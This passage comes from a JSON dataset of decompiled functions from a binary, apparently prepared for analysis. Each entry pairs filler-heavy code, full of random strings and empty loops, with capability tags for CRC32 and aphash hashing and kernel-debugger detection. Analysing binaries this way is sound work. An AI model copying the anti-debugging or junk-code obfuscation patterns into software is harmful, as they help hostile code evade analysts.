< var_a4h; var_a4h = var_a4h + -1) {\n        }\n    }\n    var_10h = 2;\n    fcn.00401e79(\"koheaumvqndiukgfzenjokhybzxxracyanhaplndnhmyctdoebbxlzxpeiuersnbkfdqmhcgayffakdkrmjyjqexskjunhmisycp\")\n    ;\n    var_10h = 5;\n    fcn.00401e79(\"koheaumvqndiukgfzenjokhybzxxracyanhaplndnhmyctdoebbxlzxpeiuersnbkfdqmhcgayffakdkrmjyjqexskjunhmisycp\")\n    ;\n    uVar1 = fcn.004042dc(&var_d4h, &var_bch);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_d8h = 0x44; 0 < var_d8h; var_d8h = var_d8h + -1) {\n        }\n    }\n    var_10h = 2;\n    fcn.00401e79(\"bluzrnzdktsuiarlrndvlcrzzpshkzqwggwxcwhsqwdxqepmmpqehzqnzghzllupgyatdbyvqtbpprrvcwrbsdyrppqwdd\");\n    var_10h = 4;\n    fcn.00401e79(\"bluzrnzdktsuiarlrndvlcrzzpshkzqwggwxcwhsqwdxqepmmpqehzqnzghzllupgyatdbyvqtbpprrvcwrbsdyrppqwdd\");\n    uVar1 = fcn.00405b37(&var_108h, &var_f0h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_10ch = 0x43; 0 < var_10ch; var_10ch = var_10ch + -1) {\n        }\n    }\n    var_10h = 2;\n    fcn.00401e79(\"otcsbymtmouuyqmdjmvalyswyhfkqaszjfffjxrokiemttqhruusguqddynenhcfqnwjmqnayafcaixv\");\n    var_10h = 3;\n    fcn.00401e79(\"otcsbymtmouuyqmdjmvalyswyhfkqaszjfffjxrokiemttqhruusguqddynenhcfqnwjmqnayafcaixv\");\n    uVar1 = fcn.004042dc(&var_13ch, &var_124h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_140h = 0x18; 0 < var_140h; var_140h = var_140h + -1) {\n        }\n    }\n    for (stack0xfffffeb8 = 0x53; 0 < stack0xfffffeb8; *NULL = stack0xfffffeb8 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return *0x5473e4;\n}\n",
        "token_count": 1529
    },
    "004064ce": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.004064ce(void)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t var_16dh;\n    uint var_168h;\n    uint var_150h;\n    int32_t var_138h;\n    uint var_134h;\n    uint var_11ch;\n    int32_t var_104h;\n    uint var_100h;\n    uint var_e8h;\n    int32_t var_d0h;\n    uint var_cch;\n    uint var_b4h;\n    uint var_9ch;\n    uint var_84h;\n    uchar var_69h;\n    uint var_68h;\n    uint var_50h;\n    uint var_38h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xfffffe84;\n    var_10h = 0xffffffff;\n    var_14h = 0x450ba0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    fcn.00401e79(\"vbhmgjryytrxnkwwevfcvrarubqyorq\");\n    var_10h = 0;\n    fcn.00401e79(\"exrhwvuspscyydbecubcpeykospfiwiyhvanusbexwkblwevwvnoynbdaliicicfapzjztbyhlssrs\");\n    var_10h = 1;\n    fcn.00401e79(\"ugtpjmzcvsifwakyoqb\");\n    var_69h = 1;\n    var_10h = 2;\n    fcn.00401e79(\"nbhxwcxyjmslefqtv\");\n    var_10h = 3;\n    fcn.00401e79(0x54cf8b);\n    var_10h = 4;\n    fcn.00401e79(0x54cf8b);\n    var_10h = 8;\n    fcn.00401e79(0x54cf8b);\n    uVar1 = fcn.004042dc(&var_cch, &var_b4h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_d0h = 0x14; 0 < var_d0h; var_d0h = var_d0h + -1) {\n        }\n    }\n    var_10h = 4;\n    fcn.00401e79(\"exrhwvuspscyydbecubcpeykospfiwiyhvanusbexwkblwevwvnoynbdaliicicfapzjztbyhlssrs\");\n    var_10h = 7;\n    fcn.00401e79(\"exrhwvuspscyydbecubcpeykospfiwiyhvanusbexwkblwevwvnoynbdaliicicfapzjztbyhlssrs\");\n    uVar1 = fcn.00405b37(&var_100h, &var_e8h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_104h = 0x23; 0 < var_104h; var_104h = var_104h + -1) {\n        }\n    }\n    var_10h = 4;\n    fcn.00401e79(\"ugtpjmzcvsifwakyoqb\");\n    var_10h = 6;\n    fcn.00401e79(\"ugtpjmzcvsifwakyoqb\");\n    uVar1 = fcn.004042dc(&var_134h, &var_11ch);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_138h = 0x19; 0 < var_138h; var_138h = var_138h + -1) {\n        }\n    }\n    var_10h = 4;\n    fcn.00401e79(\"nbhxwcxyjmslefqtv\");\n    var_10h = 5;\n    fcn.00401e79(\"nbhxwcxyjmslefqtv\");\n    uVar1 = fcn.00405b37(&var_168h, &var_150h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (stack0xfffffe90 = 8; 0 < stack0xfffffe90; *NULL = stack0xfffffe90 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return 0xedcd;\n}\n",
        "token_count": 1166
    },
    "00406550": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406550(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (arg_8h == 0) {\n        uVar1 = fcn.004b0097(0);\n        return uVar1;\n    }\n    iVar2 = fcn.004042b9(arg_8h);\n    if (iVar2 == 0) {\n        if ((*(arg_8h + 0xc) >> 0xb & 1) != 0) {\n            uVar1 = fcn.00406005(arg_8h);\n            iVar2 = fcn.004047f0(uVar1);\n            if (iVar2 != 0) goto code_r0x004b02d7;\n        }\n        uVar1 = 0;\n    }\n    else {\ncode_r0x004b02d7:\n        uVar1 = 0xffffffff;\n    }\n    return uVar1;\n}\n",
        "token_count": 214
    },
    "00406578": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406578(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_130h;\n    uint var_12ch;\n    int32_t var_128h;\n    uint var_124h;\n    uint var_10ch;\n    int32_t var_f4h;\n    uint var_f0h;\n    uint var_d8h;\n    int32_t var_c0h;\n    uint var_bch;\n    uint var_a4h;\n    int32_t var_8ch;\n    uint var_88h;\n    uint var_70h;\n    int32_t var_58h;\n    uint var_54h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xfffffec0;\n    var_14h = 0x418010;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 1;\n    fcn.00401e79(\"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\");\n    var_3ch = 0x138;\n    var_10h = 2;\n    fcn.00401e79(\"lggwjbjupkawlhqhyxiofutvsihwgotveytsqwwcwkvtckeevtrrafnaoznmwcyppijspqwinfpjcdusrrwcjttkxdmu\");\n    for (var_58h = 0xd; 0 < var_58h; var_58h = var_58h + -1) {\n    }\n    var_10h = 3;\n    fcn.00401e79(\"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\");\n    var_10h = 7;\n    fcn.00401e79(\"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\");\n    uVar1 = fcn.00405b37(&var_88h, &var_70h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_8ch = 0x15; 0 < var_8ch; var_8ch = var_8ch + -1) {\n        }\n    }\n    var_10h = 3;\n    fcn.00401e79(\"lggwjbjupkawlhqhyxiofutvsihwgotveytsqwwcwkvtckeevtrrafnaoznmwcyppijspqwinfpjcdusrrwcjttkxdmu\");\n    var_10h = 6;\n    fcn.00401e79(\"lggwjbjupkawlhqhyxiofutvsihwgotveytsqwwcwkvtckeevtrrafnaoznmwcyppijspqwinfpjcdusrrwcjttkxdmu\");\n    uVar1 = fcn.00405b37(&var_bch, &var_a4h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_c0h = 0x35; 0 < var_c0h; var_c0h = var_c0h + -1) {\n        }\n    }\n    var_10h = 3;\n    fcn.00401e79(\"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\");\n    var_10h = 5;\n    fcn.00401e79(\"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\");\n    uVar1 = fcn.00405b37(&var_f0h, &var_d8h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_f4h = 0x31; 0 < var_f4h; var_f4h = var_f4h + -1) {\n        }\n    }\n    var_10h = 3;\n    fcn.00401e79(\"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\");\n    var_10h = 4;\n    fcn.00401e79(\"qsaajusedeslvnsvwicyaebvhimstjchtoehygbelnumtarehbdpba\");\n    uVar1 = fcn.00405b37(&var_124h, &var_10ch);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_128h = 0x50; 0 < var_128h; var_128h = var_128h + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return 1;\n}\n",
        "token_count": 1285
    },
    "004065aa": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004065aa(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    code **ppcVar2;\n    int32_t unaff_EBP;\n    bool bVar3;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar4;\n    \n    uVar4 = 0x38;\n    fcn.00403120();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar2 = fcn.00402513(0x44, uVar4);\n        *(unaff_EBP + -0x10) = ppcVar2;\n        *(unaff_EBP + -4) = 0;\n        bVar3 = ppcVar2 == NULL;\n        if (bVar3) {\n            ppcVar2 = NULL;\n        }\n        else {\n            uVar4 = fcn.00406640();\n            uVar4 = fcn.00404714(uVar4);\n            ppcVar2[1] = NULL;\n            *ppcVar2 = vtable.std::ctype_unsigned_short_int_.0;\n            fcn.0040482c(uVar4);\n        }\n        *piVar1 = ppcVar2;\n        if (!bVar3) {\n            fcn.00401fff();\n        }\n    }\n    fcn.00401127();\n    return;\n}\n",
        "token_count": 363
    },
    "0040662c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl\nfcn.0040662c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint noname_8, uint arg_2ch, uint noname_10, uint arg_34h, uint noname_12, uint arg_3ch)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack208;\n    uchar auStack204 [24];\n    uchar auStack180 [51];\n    uchar uStack129;\n    uint uStack104;\n    uint uStack100;\n    uint8_t uStack67;\n    uint8_t uStack66;\n    uchar uStack65;\n    ulong uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    uint8_t uStack37;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff18;\n    uStack48 = CONCAT44(noname_12, arg_34h);\n    uStack56 = CONCAT44(noname_10, arg_2ch);\n    uStack64 = CONCAT44(noname_8, arg_24h);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x451800;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack37 = arg_3ch & 1;\n    uVar2 = CONCAT11(arg_1ch, arg_14h) & 0x1ff;\n    uStack65 = uVar2 >> 8;\n    uStack66 = arg_18h & 1;\n    uStack67 = uVar2 & 1;\n    fcn.00401e79(\"vurtmmvtt\");\n    uStack100 = 0x40ccd700;\n    uStack104 = 0;\n    uStack24 = 0;\n    fcn.00401e79(\"mnhxgiejwljxiknfimvrhtlleptwtqozfjpmxrfodseqnzmdaqrewbrqeddeamakczyliqgyiucrxesrjirul\");\n    uStack129 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"mqrwexgxagxdqgiyjvdmkjgghgzfdxddiuuoqbqoyxtanav\");\n    uStack24 = 2;\n    fcn.00401e79(\"mqrwexgxagxdqgiyjvdmkjgghgzfdxddiuuoqbqoyxtanav\");\n    uStack24 = 3;\n    fcn.00401e79(\"mqrwexgxagxdqgiyjvdmkjgghgzfdxddiuuoqbqoyxtanav\");\n    uVar1 = fcn.00405b37(auStack204, auStack180);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack208 = 0x40; 0 < iStack208; iStack208 = iStack208 + -1) {\n        }\n    }\n    uStack24 = 2;\n    fcn.00401e79(0x544a21);\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 835
    },
    "00406668": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00406668(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack156;\n    uchar auStack152 [24];\n    uchar auStack128 [24];\n    uint uStack104;\n    uint uStack100;\n    uint uStack72;\n    uchar uStack65;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff50;\n    uStack28 = 0x4506a0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"jiyoonozeuvzsywjxcooebhxmfnqdgekrappownaruldsrnqxaghxijnvzatouxywdntvdh\");\n    uStack65 = 1;\n    uStack72 = 0x1ccc;\n    uStack24 = 1;\n    fcn.00401e79(\"rykxkxzmyxufjoycxwcagbufijcbjcpmjovbeacfoeyglrthmwoprerqofjsbrzkzgtyvrvf\");\n    uStack100 = 0x40cd8b00;\n    uStack104 = 0;\n    uStack24 = 2;\n    fcn.00401e79(\"jiyoonozeuvzsywjxcooebhxmfnqdgekrappownaruldsrnqxaghxijnvzatouxywdntvdh\");\n    uStack24 = 3;\n    fcn.00401e79(\"jiyoonozeuvzsywjxcooebhxmfnqdgekrappownaruldsrnqxaghxijnvzatouxywdntvdh\");\n    uVar1 = fcn.00405b37(auStack152, auStack128);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack156 = 0x47; 0 < iStack156; iStack156 = iStack156 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x111e4;\n}\n",
        "token_count": 575
    },
    "00406677": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406677(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_e4h;\n    int32_t var_e0h;\n    uint var_dch;\n    uint var_c4h;\n    int32_t var_ach;\n    uint var_a8h;\n    uint var_90h;\n    int32_t var_78h;\n    uint var_74h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff0c;\n    var_14h = 0x4510c0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 0;\n    fcn.00401e79(\"rrdxhpzlbdwhtguwrdzvjgfdqpcelrqnturjhwjxxmpwonpvmdbabxwgbucadfskzkpgudeptsfyoeiyilvkcjony\");\n    var_3ch = 0x1b3;\n    var_40h = 0x19aa;\n    var_10h = 1;\n    fcn.00401e79(\"zamktifurmvcprzmfhjdhmtptwxgnmzojgmgydkzyxtuzfgbvwrhgfrdkpuyroosffntyfwnqogp\");\n    var_5ch = 0x9b;\n    var_10h = 2;\n    fcn.00401e79(\"bbmgeueoiirgblisyqs\");\n    for (var_78h = 0x39; 0 < var_78h; var_78h = var_78h + -1) {\n    }\n    var_10h = 3;\n    fcn.00401e79(\"rrdxhpzlbdwhtguwrdzvjgfdqpcelrqnturjhwjxxmpwonpvmdbabxwgbucadfskzkpgudeptsfyoeiyilvkcjony\");\n    var_10h = 5;\n    fcn.00401e79(\"rrdxhpzlbdwhtguwrdzvjgfdqpcelrqnturjhwjxxmpwonpvmdbabxwgbucadfskzkpgudeptsfyoeiyilvkcjony\");\n    uVar1 = fcn.00405b37(&var_a8h, &var_90h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_ach = 0x5a; 0 < var_ach; var_ach = var_ach + -1) {\n        }\n    }\n    var_10h = 3;\n    fcn.00401e79(\"bbmgeueoiirgblisyqs\");\n    var_10h = 4;\n    fcn.00401e79(\"bbmgeueoiirgblisyqs\");\n    uVar1 = fcn.004042dc(&var_dch, &var_c4h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_e0h = 0x5c; 0 < var_e0h; var_e0h = var_e0h + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 887
    },
    "004066a4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.004066a4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_4h;\n    \n    fcn.00401e79(\"vlbxvggxlodqidrdwuvowfkhnhccvjcfmlogrpekkrdyev\");\n    fcn.00403b02();\n    return 1;\n}\n",
        "token_count": 108
    },
    "004066c2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint fcn.004066c2(void)\n\n{\n    return 0;\n}\n",
        "token_count": 18
    },
    "00406776": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * __cdecl fcn.00406776(uint arg_8h)\n\n{\n    uchar *in_ECX;\n    uint var_14h;\n    uint var_dh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_dh._0_1_ = 1;\n    if (*(in_ECX + 4) != 0) {\n        var_8h = fcn.00401569(arg_8h);\n        *NULL = fcn.004025d6();\n        var_dh._0_1_ = fcn.0040148d(&var_dh + 1, &var_8h);\n    }\n    if ((var_dh & 1) != 0) {\n        *in_ECX = 1;\n    }\n    return in_ECX;\n}\n",
        "token_count": 186
    },
    "004067a3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004067a3(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_10h;\n    uint var_8h;\n    uint var_1h;\n    \n    uVar1 = fcn.00402a27();\n    fcn.004027d9(uVar1 | arg_8h, arg_ch & 1);\n    return;\n}\n",
        "token_count": 110
    },
    "004067bc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004067bc(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    uint var_54h;\n    uchar var_39h;\n    uint var_38h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff7c;\n    var_14h = 0x451300;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 0;\n    fcn.00401e79(\"vrecxuyzcskjcihqwnsohvcleozaegelgwfflbln\");\n    var_39h = 0;\n    var_10h = 1;\n    fcn.00401e79(\"vrecxuyzcskjcihqwnsohvcleozaegelgwfflbln\");\n    var_10h = 2;\n    fcn.00401e79(\"vrecxuyzcskjcihqwnsohvcleozaegelgwfflbln\");\n    uVar1 = fcn.004042dc(&var_6ch, &var_54h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_70h = 0x5f; 0 < var_70h; var_70h = var_70h + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 423
    },
    "004067da": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004067da(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_b8h;\n    int32_t var_b4h;\n    uint var_b0h;\n    uint var_98h;\n    int32_t var_80h;\n    uint var_7ch;\n    uint var_64h;\n    uint var_4ch;\n    uint var_48h;\n    uchar var_41h;\n    uint var_40h;\n    uint var_3ch;\n    uchar var_21h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff38;\n    var_14h = 0x417f90;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_21h = 1;\n    var_10h = 0;\n    fcn.00401e79(\"vstlwurbodujvjodfqqaqedlgvofnwnzexeohpbyrfykusrwztnrzslindsjppffmo\");\n    var_40h = 0xa2e;\n    var_41h = 1;\n    var_48h = 0xfc3;\n    var_4ch = 0x1cbe;\n    var_10h = 1;\n    fcn.00401e79(\"xnkpmtcaplfycqyoopkudrdbxvgtcmnokadhfexhcbiydcjgpnvssxod\");\n    var_10h = 2;\n    fcn.00401e79(\"tdijdkybhpuoscexkuwcakjiknzwyyudgziambipwgnvbcukq\");\n    for (var_80h = 0x1b; 0 < var_80h; var_80h = var_80h + -1) {\n    }\n    var_10h = 3;\n    fcn.00401e79(\"tdijdkybhpuoscexkuwcakjiknzwyyudgziambipwgnvbcukq\");\n    var_10h = 4;\n    fcn.00401e79(\"tdijdkybhpuoscexkuwcakjiknzwyyudgziambipwgnvbcukq\");\n    uVar1 = fcn.00405b37(&var_b0h, &var_98h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_b4h = 0x60; 0 < var_b4h; var_b4h = var_b4h + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return 0x1580;\n}\n",
        "token_count": 703
    },
    "00406843": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00406843(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_0000000c;\n    int32_t iStack196;\n    int32_t iStack192;\n    uchar auStack188 [24];\n    uchar auStack164 [24];\n    int32_t iStack140;\n    uchar auStack136 [24];\n    uchar auStack112 [24];\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    ulong uStack48;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff20;\n    uStack48 = CONCAT44(in_stack_0000000c, arg_ch);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x450d80;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"tdgsoqfvnhxkqoyabzmskkupbqngeevpnzsntypsjawlegvckdfdbloqscntshsogqyfexdok\");\n    uStack80 = 0xb83;\n    uStack84 = 0x40de2b40;\n    uStack88 = 0;\n    uStack24 = 0;\n    fcn.00401e79(\"tdgsoqfvnhxkqoyabzmskkupbqngeevpnzsntypsjawlegvckdfdbloqscntshsogqyfexdok\");\n    uStack24 = 2;\n    fcn.00401e79(\"tdgsoqfvnhxkqoyabzmskkupbqngeevpnzsntypsjawlegvckdfdbloqscntshsogqyfexdok\");\n    uVar1 = fcn.00405b37(auStack136, auStack112);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack140 = 0x30; 0 < iStack140; iStack140 = iStack140 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"tdgsoqfvnhxkqoyabzmskkupbqngeevpnzsntypsjawlegvckdfdbloqscntshsogqyfexdok\");\n    uStack24 = 1;\n    fcn.00401e79(\"tdgsoqfvnhxkqoyabzmskkupbqngeevpnzsntypsjawlegvckdfdbloqscntshsogqyfexdok\");\n    uVar1 = fcn.00405b37(auStack188, auStack164);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack192 = 0x2b; 0 < iStack192; iStack192 = iStack192 + -1) {\n        }\n    }\n    for (iStack196 = 0x1b; 0 < iStack196; iStack196 = iStack196 + -1) {\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"orzcns\");\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 837
    },
    "004068a2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x0040c89c)\n// WARNING: Removing unreachable block (ram,0x0040c7f8)\n// WARNING: Removing unreachable block (ram,0x0040c8f5)\n\nuint64_t __cdecl\nfcn.004068a2(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint noname_4, uint32_t arg_1ch, int32_t arg_20h, \n            uint32_t arg_24h, int32_t arg_28h, uint32_t arg_2ch, int32_t arg_30h, uint arg_34h, uint arg_38h, \n            uint arg_3ch, uint noname_14, uint arg_44h, uint arg_48h, uint arg_4ch, uint arg_50h, uint arg_54h, \n            uint arg_58h, uint arg_5ch, uint arg_60h, uint arg_64h, uint arg_68h, uint arg_6ch, uint arg_70h, \n            uint arg_74h, uint32_t arg_78h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint uVar5;\n 